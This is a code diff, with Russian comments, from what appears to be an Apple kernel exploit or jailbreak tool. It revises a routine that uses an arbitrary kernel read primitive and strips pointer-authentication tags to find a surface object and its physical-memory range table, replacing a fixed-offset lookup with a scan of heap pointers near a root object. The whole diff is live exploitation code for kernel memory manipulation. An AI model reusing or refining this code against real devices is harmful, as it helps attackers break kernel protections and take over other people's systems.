@@ -5897,36 +5897,29 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     kpNote(r, [NSString stringWithFormat:@"  резолв: surfVA=%#llx rangesVA=%#llx",
               (unsigned long long)surfVA, (unsigned long long)rangesVA]);
     if (!surfVA && rootVA) {
-        // Путь B (раунд 23): surface-таблица на root: count=[root+0xd8],
-        // array=[root+0xd0], obj=array[id], verify [obj+0x10]==id.
-        // (1.9.138 дампил +0x400..0x480 — не то окно.)
-        uint64_t cntR = early_kread64(rootVA + 0xd8);
-        uint64_t arrR = kp_untag_ptr(early_kread64(rootVA + 0xd0));
-        kpNote(r, [NSString stringWithFormat:@"  Path B: count=%llu array=%#llx",
-                  (unsigned long long)cntR, (unsigned long long)arrR]);
-        if (cntR > dstID && cntR < 0x400000 && kpLooksLikeKernelPointer(arrR)) {
-            uint64_t cand = kp_untag_ptr(early_kread64(arrR + (uint64_t)dstID * 8));
-            if (kpLooksLikeKernelPointer(cand)) {
+        // 1.9.140: count по +0xd8 не count вовсе (PAC'd ptr). Дженерик-скан:
+        // каждый heap-ptr поля rootVA+0xc0..0x120 = кандидат массива
+        // поверхностей; в нём ищем запись [cand+0x10]==dstID + ranges-цепочка
+        // против backingPA. Верификация сама выбирает, count не нужен.
+        kpNote(r, @"  дженерик-скан heap-ptr'ов rootVA как кандидатов массива:");
+        for (uint64_t oo = 0xc0; oo <= 0x120 && !rangesVA; oo += 8) {
+            uint64_t P = kp_untag_ptr(early_kread64(rootVA + oo));
+            if (!kpLooksLikeKernelPointer(P)) continue;
+            for (uint32_t i = 0; i < 0x40 && !rangesVA; i++) {
+                uint64_t cand = kp_untag_ptr(early_kread64(P + (uint64_t)i * 8));
+                if (!kpLooksLikeKernelPointer(cand)) continue;
                 uint32_t cid = (uint32_t)early_kread64(cand + 0x10);
-                kpNote(r, [NSString stringWithFormat:@"    Path B cand=%#llx [cand+0x10]=%u",
-                          (unsigned long long)cand, cid]);
-                if (cid == dstID) {
-                    uint64_t ro = kp_untag_ptr(early_kread64(cand + 0x178));
-                    uint64_t rq = kpLooksLikeKernelPointer(ro) ? early_kread64(ro + 0x18) : 0;
-                    if ((uint32_t)(rq >> 32) == pfn32 && (uint32_t)rq == 1) {
-                        surfVA = cand;
-                        rangesVA = ro + 0x18;
-                        kpNote(r, [NSString stringWithFormat:@"  ★ Path B: surfVA=%#llx rangeObj=%#llx rangesVA=%#llx (qword=%#018llx)",
-                                  (unsigned long long)surfVA, (unsigned long long)ro,
-                                  (unsigned long long)rangesVA, (unsigned long long)rq]);
-                    }
-                }
+                if (cid != dstID) continue;
+                uint64_t ro = kp_untag_ptr(early_kread64(cand + 0x178));
+                uint64_t rq = kpLooksLikeKernelPointer(ro) ? early_kread64(ro + 0x18) : 0;
+                if ((uint32_t)(rq >> 32) != pfn32 || (uint32_t)rq != 1) continue;
+                surfVA = cand;
+                rangesVA = ro + 0x18;
+                kpNote(r, [NSString stringWithFormat:@"  ★ массив root+%#llx[%u]: surfVA=%#llx rangesVA=%#llx (qword=%#018llx)",
+                          oo, i, (unsigned long long)surfVA, (unsigned long long)rangesVA, (unsigned long long)rq]);
             }
         }
-        // и правильное окно для видимости
-        for (uint64_t oo = 0xc0; oo <= 0x100; oo += 8) {
-            kpNote(r, [NSString stringWithFormat:@"    root+%#03llx = %#018llx", oo, (unsigned long long)early_kread64(rootVA + oo)]);
-        }
+        if (!rangesVA) kpNote(r, @"  ни один heap-ptr не оказался массивом с нашей поверхностью");
     }
     if (!rangesVA) {
         // 1.9.130: ИЗМЕРЕНИЕ вместо тихого выхода — после execute сканируем
